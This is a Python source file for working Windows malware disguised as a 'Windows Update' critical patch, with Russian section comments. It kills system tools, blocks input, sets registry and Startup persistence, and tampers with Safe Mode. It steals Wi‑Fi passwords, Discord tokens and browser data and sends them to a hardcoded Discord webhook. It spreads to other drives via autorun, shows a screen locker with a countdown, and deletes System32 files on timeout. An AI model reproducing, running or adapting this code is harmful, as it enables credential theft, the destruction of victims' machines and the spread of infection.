import os
import sys
import time
import json
import base64
import shutil
import ctypes
import tempfile
import winreg
import socket
import getpass
import zipfile
import threading
import urllib.request
from datetime import datetime
import tkinter as tk
from tkinter import messagebox

# ============================================================
# КОНФИГ
# ============================================================
KEY = "1601"
TIMER_FILE = os.path.join(os.getenv("APPDATA"), "Microsoft", "Crypto", "RSA", "timer.dat")
TIMER_MINUTES = 30
attempts_left = 3

VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/fuxEcorp.mp4.mp4"
MP3_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc)(1).mp3"
WEBHOOK_URL = "https://discord.com/api/webhooks/1357428408852619435/EHZ9JSSjfTgLz9t4M6jFBOBQBRoo0dPvc1XEq0msvNMqNix82ljj1lX88D2zY19n7FVO"

# ============================================================
# ЗАГРУЗКА ФАЙЛОВ
# ============================================================
def download_to_temp(url, suffix):
    tmp = os.path.join(tempfile.gettempdir(), f"winupd_{int(time.time())}_{suffix}")
    urllib.request.urlretrieve(url, tmp)
    return tmp

# ============================================================
# ЗАЩИТА ПРОЦЕССА
# ============================================================
def protect_process():
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("Windows Update Service")
    except:
        pass

def hide_process():
    try:
        import win32console, win32gui
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)
    except:
        pass

def disable_win_key():
    try:
        import keyboard
        keyboard.block_key("win")
        keyboard.block_key("tab")
        keyboard.block_key("alt")
        keyboard.block_key("ctrl")
        keyboard.block_key("esc")
    except:
        pass

def kill_taskmgr_ultimate():
    while True:
        try:
            os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
            os.system("taskkill /f /im cmd.exe >nul 2>&1")
            os.system("taskkill /f /im powershell.exe >nul 2>&1")
            os.system("taskkill /f /im regedit.exe >nul 2>&1")
            os.system("taskkill /f /im msconfig.exe >nul 2>&1")
            os.system("taskkill /f /im mmc.exe >nul 2>&1")
            os.system("taskkill /f /im procmon.exe >nul 2>&1")
        except:
            pass
        time.sleep(0.1)

def block_safe_mode():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SafeBoot", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Option", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except:
        pass
    try:
        os.system("bcdedit /deletevalue {current} safeboot >nul 2>&1")
        os.system("bcdedit /deletevalue {default} safeboot >nul 2>&1")
    except:
        pass

# ============================================================
# АВТОЗАГРУЗКА
# ============================================================
def add_to_startup():
    try:
        exe_path = sys.executable
        script_path = os.path.abspath(sys.argv[0])
        bat_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.bat")
        with open(bat_path, "w") as f:
            f.write(f'@echo off\nstart "" "{exe_path}" "{script_path}"\nexit')
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{exe_path}" "{script_path}"')
        winreg.CloseKey(key)
        key2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key2, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{exe_path}" "{script_path}"')
        winreg.CloseKey(key2)
    except:
        pass

# ============================================================
# ТАЙМЕР
# ============================================================
def write_timer_file():
    try:
        os.makedirs(os.path.dirname(TIMER_FILE), exist_ok=True)
        end_time = time.time() + (TIMER_MINUTES * 60)
        with open(TIMER_FILE, "w") as f:
            f.write(str(end_time))
        return end_time
    except:
        return time.time() + (TIMER_MINUTES * 60)

def read_timer_file():
    try:
        with open(TIMER_FILE, "r") as f:
            return float(f.read().strip())
    except:
        return write_timer_file()

def timer_check_loop():
    while True:
        try:
            end_time = read_timer_file()
            if time.time() >= end_time:
                destroy_windows_forever()
                break
        except:
            pass
        time.sleep(1)

# ============================================================
# СТИЛЛЕР + КРАЖА ДАННЫХ
# ============================================================
def get_wifi_passwords():
    passwords = ""
    try:
        results = os.popen("netsh wlan show profiles").read()
        profiles = [line.split(":")[1].strip() for line in results.split("\n") if "All User Profile" in line]
        for profile in profiles:
            try:
                details = os.popen(f'netsh wlan show profile name="{profile}" key=clear').read()
                for line in details.split("\n"):
                    if "Key Content" in line:
                        passwords += f"{profile}: {line.split(':')[1].strip()}\n"
            except:
                pass
    except:
        pass
    return passwords

def steal_browsers():
    stolen = ""
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
    }
    for name, path in browsers.items():
        if os.path.exists(path):
            stolen += f"[{name}] PATH: {path}\n"
            try:
                for root, dirs, files in os.walk(path):
                    for f in files:
                        if f in ["Login Data", "Cookies", "Web Data", "History", "key4.db", "logins.json", "cookies.sqlite", "places.sqlite"]:
                            stolen += f"  -> {os.path.join(root, f)}\n"
            except:
                pass
    return stolen

def get_system_info():
    info = ""
    info += f"HOSTNAME: {socket.gethostname()}\n"
    info += f"USER: {getpass.getuser()}\n"
    info += f"IP: {socket.gethostbyname(socket.gethostname())}\n"
    info += f"OS: {os.popen('ver').read().strip()}\n"
    return info

def grab_tokens():
    tokens = ""
    paths = [
        os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "Lightcord", "Local Storage", "leveldb"),
    ]
    for p in paths:
        if os.path.exists(p):
            try:
                for f in os.listdir(p):
                    if f.endswith(".ldb") or f.endswith(".log"):
                        with open(os.path.join(p, f), "r", errors="ignore") as file:
                            content = file.read()
                            import re
                            found = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                            for tok in found:
                                tokens += f"DISCORD: {tok}\n"
            except:
                pass
    return tokens

def mega_steal():
    try:
        data = "=== SYSTEM INFO ===\n"
        data += get_system_info()
        data += "\n=== WIFI PASSWORDS ===\n"
        data += get_wifi_passwords()
        data += "\n=== TOKENS ===\n"
        data += grab_tokens()
        data += "\n=== BROWSERS ===\n"
        data += steal_browsers()
        data += f"\n=== TIMESTAMP ===\n{datetime.now()}\n"

        webhook_url = WEBHOOK_URL
        boundary = "----Boundary"
        body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\n```\n{data[:1800]}\n```\r\n--{boundary}--\r\n"
        req = urllib.request.Request(webhook_url, data=body.encode())
        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        urllib.request.urlopen(req, timeout=10)
    except:
        pass

# ============================================================
# УНИЧТОЖЕНИЕ
# ============================================================
def unblock_all():
    try:
        os.system("bcdedit /deletevalue {current} safeboot >nul 2>&1")
        os.system("bcdedit /deletevalue {default} safeboot >nul 2>&1")
    except:
        pass

def destroy_windows_forever():
    try:
        os.system("bcdedit /deletevalue {current} safeboot >nul 2>&1")
        os.system("bcdedit /deletevalue {default} safeboot >nul 2>&1")
    except:
        pass
    try:
        ctypes.windll.user32.MessageBoxW(0, "SYSTEM FAILURE - BOOT SECTOR CORRUPTED", "FATAL ERROR", 0x10)
        ctypes.windll.user32.BlockInput(True)
        time.sleep(0.5)
        for root, dirs, files in os.walk("C:\\Windows\\System32"):
            for f in files:
                try:
                    os.remove(os.path.join(root, f))
                except:
                    pass
        for root, dirs, files in os.walk("C:\\Windows\\SysWOW64"):
            for f in files:
                try:
                    os.remove(os.path.join(root, f))
                except:
                    pass
        os.system("shutdown /r /t 0 /f")
    except:
        os.system("shutdown /r /t 0 /f")

# ============================================================
# РАСПРОСТРАНЕНИЕ ПО СЕТИ
# ============================================================
def infect_network():
    time.sleep(10)
    try:
        exe_path = sys.executable
        script_path = os.path.abspath(sys.argv[0])
        drives = []
        for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            if os.path.exists(f"{letter}:\\"):
                drives.append(f"{letter}:\\")
        while True:
            for drive in drives:
                try:
                    if drive != "C:\\":
                        target = os.path.join(drive, "WindowsUpdate.exe")
                        if not os.path.exists(target):
                            shutil.copy(exe_path, target)
                        bat_target = os.path.join(drive, "autorun.inf")
                        with open(bat_target, "w") as f:
                            f.write("[autorun]\nopen=WindowsUpdate.exe\naction=Open folder to view files\n")
                        os.system(f"attrib +h +s {bat_target} >nul 2>&1")
                        os.system(f"attrib +h +s {target} >nul 2>&1")
                except:
                    pass
            time.sleep(60)
    except:
        pass

# ============================================================
# ВИДЕО + ЗВУК
# ============================================================
def play_video():
    try:
        import cv2
        video_path = download_to_temp(VIDEO_URL, "video.mp4")
        cap = cv2.VideoCapture(video_path)
        if not cap.isOpened():
            return
        cv2.namedWindow("Windows Update", cv2.WND_PROP_FULLSCREEN)
        cv2.setWindowProperty("Windows Update", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
        fps = cap.get(cv2.CAP_PROP_FPS)
        delay = int(1000 / fps) if fps > 0 else 30
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            cv2.imshow("Windows Update", frame)
            if cv2.waitKey(delay) & 0xFF == 27:
                break
        cap.release()
        cv2.destroyAllWindows()
    except:
        pass

def play_mp3_loop(mp3_path):
    try:
        import pygame
        pygame.mixer.init()
        pygame.mixer.music.load(mp3_path)
        pygame.mixer.music.play(-1)
    except:
        pass

# ============================================================
# АНИМАЦИИ
# ============================================================
def anim_fsociety():
    pass

def anim_stealer():
    pass

def anim_connect():
    pass

# ============================================================
# БЛОКИРОВКА ВСЕГО
# ============================================================
def block_everything():
    try:
        ctypes.windll.user32.BlockInput(True)
    except:
        pass

# ============================================================
# ГЛАВНЫЙ ОКНО ВИНЛОКЕРА
# ============================================================
class Updater:
    def __init__(self):
        self.timer_end = read_timer_file()
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.title("Windows Update - Critical Security Patch")
        self.win.configure(bg='black')
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        self.win.bind("<Alt-F4>", lambda e: None)
        self.win.bind("<Escape>", lambda e: None)
        
        f = tk.Frame(self.win, bg='black')
        f.pack(expand=True)
        
        tk.Label(f, text="WINDOWS UPDATE", font=('Courier', 24, 'bold'), bg='black', fg='#ff0000').pack(pady=10)
        tk.Label(f, text="CRITICAL SECURITY PATCH REQUIRED", font=('Courier', 14), bg='black', fg='#ff0000').pack(pady=5)
        tk.Label(f, text="YOUR SYSTEM HAS BEEN COMPROMISED", font=('Courier', 12), bg='black', fg='white').pack(pady=5)
        tk.Label(f, text="ENTER RECOVERY KEY TO RESTORE SYSTEM", font=('Courier', 12), bg='black', fg='white').pack(pady=5)
        
        self.timer_label = tk.Label(f, text="00:00:00", font=('Courier', 36, 'bold'), bg='black', fg='#ff0000')
        self.timer_label.pack(pady=20)
        
        cf = tk.Frame(f, bg='black')
        cf.pack(pady=10)
        self.pw = tk.Entry(cf, show="*", font=('Courier', 14, 'bold'), bg='white', fg='black', relief='solid', bd=2)
        self.pw.pack(pady=(0, 5), ipadx=40, ipady=3)
        self.sl = tk.Label(cf, text=f"ATTEMPTS LEFT: {attempts_left}", bg='black', fg='white', font=('Courier', 12, 'bold'))
        self.sl.pack()
        self.pw.bind('<Return>', self.check)
        self.pw.focus_force()
        self.win.after(100, self._keep)
        self.update_timer()

    def update_timer(self):
        remaining = self.timer_end - time.time()
        if remaining <= 0:
            destroy_windows_forever()
        h = int(remaining // 3600)
        m = int((remaining % 3600) // 60)
        s = int(remaining % 60)
        self.timer_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")
        self.win.after(1000, self.update_timer)

    def _keep(self):
        try:
            self.win.focus_force()
            self.pw.focus_force()
            self.win.after(100, self._keep)
        except:
            pass

    def check(self, e=None):
        global attempts_left
        if self.pw.get() == KEY:
            try:
                import pygame
                pygame.mixer.music.stop()
            except:
                pass
            unblock_all()
            self.sl.config(text="CORRECT!", fg='white')
            self.win.update()
            try:
                os.remove(TIMER_FILE)
            except:
                pass
            time.sleep(1)
            self.root.destroy()
            os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0:
                self.sl.config(text=f"INCORRECT! ATTEMPTS LEFT: {attempts_left}", fg='white')
            else:
                try:
                    import pygame
                    pygame.mixer.music.stop()
                except:
                    pass
                self.sl.config(text="404 | SYSTEM ERROR", fg='white')
                self.win.update()
                time.sleep(2)
                destroy_windows_forever()
            self.pw.delete(0, tk.END)


# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == "__main__":
    protect_process()
    disable_win_key()
    hide_process()
    threading.Thread(target=kill_taskmgr_ultimate, daemon=True).start()
    threading.Thread(target=mega_steal, daemon=True).start()
    add_to_startup()
    block_safe_mode()
    threading.Thread(target=infect_network, daemon=True).start()
    threading.Thread(target=timer_check_loop, daemon=True).start()

    anim_fsociety()
    anim_stealer()
    anim_connect()
    play_video()
    
    # Качаем и запускаем MP3
    try:
        mp3_path = download_to_temp(MP3_URL, "music.mp3")
        play_mp3_loop(mp3_path)
    except:
        pass
    
    block_everything()
    Updater()
    tk.mainloop()
